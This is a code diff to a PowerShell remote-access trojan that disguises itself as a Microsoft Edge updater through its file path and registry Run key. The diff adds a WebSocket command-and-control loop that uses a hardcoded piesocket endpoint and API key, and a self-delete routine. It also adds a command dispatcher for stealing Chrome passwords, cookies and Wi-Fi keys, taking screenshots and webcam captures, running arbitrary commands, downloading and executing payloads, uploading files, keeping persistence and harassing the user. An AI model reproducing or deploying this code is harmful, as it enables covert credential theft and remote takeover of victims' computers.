@@ -57,7 +57,7 @@ function Get-WssUrl {
         $url = (Invoke-WebRequest -Uri $wssUrlFile -UseBasicParsing -TimeoutSec 10).Content.Trim()
         return $url
     } catch {
-        return "wss://idk--sjeje2553.replit.app"
+        return "wss://free.blr2.piesocket.com/v3/1?api_key=bJpyvYTy22qCCTlsfwEpe7IOhGiMzoNy3YJqTMp6&notify_self=1"
     }
 }
 
@@ -70,7 +70,6 @@ function Initialize-Persistence {
         $existing = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
         
         if (-not $existing) {
-            # First run - enable persistence automatically
             $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
             
             if (-not (Test-Path $targetDir)) {
@@ -80,12 +79,10 @@ function Initialize-Persistence {
             
             $scriptPath = "$targetDir\updater.ps1"
             
-            # Copy self to persistent location if not already there
             if ($PSCommandPath -ne $scriptPath) {
                 Copy-Item $PSCommandPath $scriptPath -Force
             }
             
-            # Create BAT launcher (no VBS)
             $batPath = "$targetDir\launcher.bat"
             $batContent = @"
 @echo off
@@ -94,7 +91,6 @@ exit
 "@
             Set-Content -Path $batPath -Value $batContent -Force
             
-            # Add to startup
             $regValue = "cmd.exe /c start /min `"`" `"$batPath`""
             Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
             
@@ -135,12 +131,10 @@ function Set-Persistence {
         
         $scriptPath = "$targetDir\updater.ps1"
         
-        # Copy self to persistent location
         if ($PSCommandPath -ne $scriptPath) {
             Copy-Item $PSCommandPath $scriptPath -Force
         }
         
-        # Create BAT launcher (no VBS)
         $batPath = "$targetDir\launcher.bat"
         $batContent = @"
 @echo off
@@ -149,14 +143,12 @@ exit
 "@
         Set-Content -Path $batPath -Value $batContent -Force
         
-        # Add BAT to startup
         $regValue = "cmd.exe /c start /min `"`" `"$batPath`""
         Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
         
         $global:persistEnabled = $true
         return "Persistence enabled (startup auto-run activated)"
     } else {
-        # Remove from startup
         Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
         $global:persistEnabled = $false
         return "Persistence disabled (will NOT run on startup)"
@@ -731,6 +723,259 @@ function Remove-SelfDelete {
         $scriptPath = $PSCommandPath
         $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
         
-        # Remove from startup registry
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue
         
+        $batContent = @"
+@echo off
+timeout /t 2 /nobreak >nul
+del /f /q "$scriptPath"
+del /f /q "$targetDir\updater.ps1"
+del /f /q "$targetDir\launcher.bat"
+rmdir /q "$targetDir"
+del /f /q "%~f0"
+"@
+        
+        $batPath = "$env:TEMP\cleanup_$(Get-Random).bat"
+        Set-Content $batPath $batContent
+        
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`"" -WindowStyle Hidden
+        
+        return "Self-destruct initiated (removed from startup)"
+        Start-Sleep -Seconds 1
+        exit
+    } catch {
+        return "Self-delete failed: $($_.Exception.Message)"
+    }
+}
+
+function Process-Command {
+    param([string]$message)
+    
+    if ($message.StartsWith("#")) {
+        $parts = $message.Substring(1) -split ' ', 2
+        $targetUid = $parts[0]
+        
+        if ($targetUid -ne $global:uid) {
+            return $null
+        }
+        
+        if ($parts.Length -lt 2) {
+            return $null
+        }
+        $message = $parts[1]
+    }
+    
+    if (-not $message.StartsWith($botPrefix)) { return $null }
+    
+    $parts = $message.Substring(1) -split ' '
+    $cmd = $parts[0].ToLower()
+    $args = $parts[1..($parts.Length-1)]
+    
+    switch ($cmd) {
+        "info" { return Get-SystemInfo }
+        "exec" {
+            if ($args.Count -gt 0) {
+                return Execute-Command -cmd ($args -join ' ')
+            }
+            return "Usage: /exec <command>"
+        }
+        "download" {
+            if ($args.Count -ge 2) {
+                return Download-File -url $args[0] -path ($args[1..($args.Count-1)] -join ' ')
+            }
+            return "Usage: /download <url> <path>"
+        }
+        "upload" {
+            if ($args.Count -gt 0) {
+                return Upload-File -filePath ($args -join ' ')
+            }
+            return "Usage: /upload <filepath>"
+        }
+        "ss" { return Take-Screenshot }
+        "webcam" { return Capture-Webcam }
+        "wifi" { return Get-WiFiPasswords }
+        "passwords" { return Get-ChromePasswords }
+        "cookies" { return Get-ChromeCookies }
+        "netinfo" { return Get-NetworkInfo }
+        "ports" { return Get-OpenPorts }
+        "arp" { return Get-ArpTable }
+        "volume" {
+            if ($args.Count -gt 0 -and $args[0] -match '^\d+$') {
+                return Set-SystemVolume -percent ([int]$args[0])
+            } elseif ($args.Count -gt 0 -and $args[0] -eq "get") {
+                return Get-SystemVolume
+            }
+            return "Usage: /volume <0-100> or /volume get"
+        }
+        "tts" {
+            if ($args.Count -gt 0) {
+                return Invoke-TTS -text ($args -join ' ')
+            }
+            return "Usage: /tts <text>"
+        }
+        "play" {
+            if ($args.Count -gt 0) {
+                return Play-AudioFile -url $args[0]
+            }
+            return "Usage: /play <audio_url>"
+        }
+        "msg" {
+            if ($args.Count -gt 0) {
+                return Show-MessageBox -text ($args -join ' ')
+            }
+            return "Usage: /msg <text>"
+        }
+        "hidemouse" { return Set-MouseVisibility -visible $false }
+        "showmouse" { return Set-MouseVisibility -visible $true }
+        "shutdown" {
+            if ($args.Count -gt 0) {
+                $sec = if ($args.Count -gt 1) { [int]$args[1] } else { 30 }
+                return Invoke-SystemShutdown -action $args[0] -seconds $sec
+            }
+            return "Usage: /shutdown shutdown/restart/cancel [seconds]"
+        }
+        "flip" { return Invoke-FlipScreen }
+        "shake" { return Invoke-ShakeWindows }
+        "glitch" { return Invoke-GlitchEffect }
+        "swapkeys" {
+            $dur = if ($args.Count -gt 0) { $args[0] } else { "30" }
+            return Invoke-SwapKeys -duration $dur
+        }
+        "disablekb" {
+            $sec = if ($args.Count -gt 0) { [int]$args[0] } else { 10 }
+            return Invoke-DisableKeyboard -seconds $sec
+        }
+        "spam" {
+            if ($args.Count -gt 0) {
+                $cnt = if ($args.Count -gt 1 -and $args[-1] -match '^\d+$') { [int]$args[-1]; $args = $args[0..($args.Count-2)] } else { 50 }
+                return Invoke-SpamText -text ($args -join ' ') -count $cnt
+            }
+            return "Usage: /spam <text> [count]"
+        }
+        "toast" {
+            if ($args.Count -ge 2) {
+                return Show-ToastNotification -title $args[0] -message ($args[1..($args.Count-1)] -join ' ')
+            }
+            return "Usage: /toast <title> <message>"
+        }
+        "notifyspam" {
+            $cnt = if ($args.Count -gt 0) { [int]$args[0] } else { 20 }
+            return Invoke-SpamNotifications -count $cnt
+        }
+        "dlexec" {
+            if ($args.Count -gt 0) {
+                return Invoke-DownloadAndExecute -url $args[0]
+            }
+            return "Usage: /dlexec <url>"
+        }
+        "dlrun" {
+            if ($args.Count -ge 2) {
+                return Invoke-DownloadAndExecute -url $args[0] -args ($args[1..($args.Count-1)] -join ' ')
+            }
+            return "Usage: /dlrun <url> <args>"
+        }
+        "hide" { return Invoke-HideWindow }
+        "logout" { return Invoke-Logout }
+        "killsis" { return Invoke-KillExplorer }
+        "selfdestruct" { return Remove-SelfDelete }
+        "persist" {
+            if ($args.Count -gt 0 -and $args[0] -eq "on") {
+                return Set-Persistence -enable $true
+            } elseif ($args.Count -gt 0 -and $args[0] -eq "off") {
+                return Set-Persistence -enable $false
+            } else {
+                $status = if ($persistEnabled) { "ENABLED (auto-startup)" } else { "DISABLED" }
+                return "Persistence: $status | Usage: /persist on/off"
+            }
+        }
+        "processes" { return (Get-Process | Select-Object -First 30 Id, ProcessName, CPU | Format-Table | Out-String) }
+        "kill" {
+            if ($args.Count -gt 0) {
+                try {
+                    Stop-Process -Id $args[0] -Force
+                    return "Process $($args[0]) killed"
+                } catch {
+                    return "Failed: $($_.Exception.Message)"
+                }
+            }
+            return "Usage: /kill <pid>"
+        }
+        "exit" { return "EXIT_SIGNAL" }
+        "help" {
+            return @"
+Commands: /info /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp /volume /tts /play /msg /hidemouse /showmouse /shutdown /flip /shake /glitch /swapkeys /disablekb /spam /toast /notifyspam /dlexec /dlrun /hide /logout /killsis /persist /processes /kill /selfdestruct /exit
+"@
+        }
+        default { return "Unknown: /help" }
+    }
+}
+
+$wasFirstRun = Initialize-Persistence
+$persistEnabled = Check-Persistence
+
+while ($true) {
+    try {
+        $wssUrl = Get-WssUrl
+        
+        $ws = New-Object System.Net.WebSockets.ClientWebSocket
+        $ct = New-Object System.Threading.CancellationToken
+        
+        $uri = New-Object System.Uri($wssUrl)
+        $connectTask = $ws.ConnectAsync($uri, $ct)
+        
+        while (-not $connectTask.IsCompleted) {
+            Start-Sleep -Milliseconds 100
+        }
+        
+        if ($ws.State -eq 'Open') {
+            try {
+                $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content
+            } catch {
+                $publicIP = "Unknown"
+            }
+            
+            $autoStartMsg = if ($wasFirstRun) { " | AUTO-PERSISTENCE ENABLED" } else { "" }
+            $initMsg = "UID:$global:uid CONNECTED | IP: $publicIP | Persist: $persistEnabled$autoStartMsg"
+            $initBytes = [System.Text.Encoding]::UTF8.GetBytes($initMsg)
+            $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($initBytes), 'Text', $true, $ct)
+            $sendTask.Wait()
+            
+            while ($ws.State -eq 'Open') {
+                $buffer = New-Object byte[] 32768
+                $segment = [System.ArraySegment[byte]]::new($buffer)
+                $receiveTask = $ws.ReceiveAsync($segment, $ct)
+                
+                while (-not $receiveTask.IsCompleted) {
+                    Start-Sleep -Milliseconds 100
+                }
+                
+                $result = $receiveTask.Result
+                
+                if ($result.MessageType -eq 'Text') {
+                    $receivedMsg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
+                    
+                    $response = Process-Command -message $receivedMsg
+                    
+                    if ($response -eq "EXIT_SIGNAL") {
+                        $ws.CloseAsync('NormalClosure', 'Exit', $ct).Wait()
+                        exit
+                    }
+                    
+                    if ($response) {
+                        $responseMsg = "[$global:uid] $response"
+                        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseMsg)
+                        
+                        $sendSegment = [System.ArraySegment[byte]]::new($responseBytes)
+                        $sendTask = $ws.SendAsync($sendSegment, 'Text', $true, $ct)
+                        $sendTask.Wait()
+                    }
+                }
+            }
+        }
+        
+        $ws.Dispose()
+        
+    } catch {}
+    
+    Start-Sleep -Seconds 20
+}
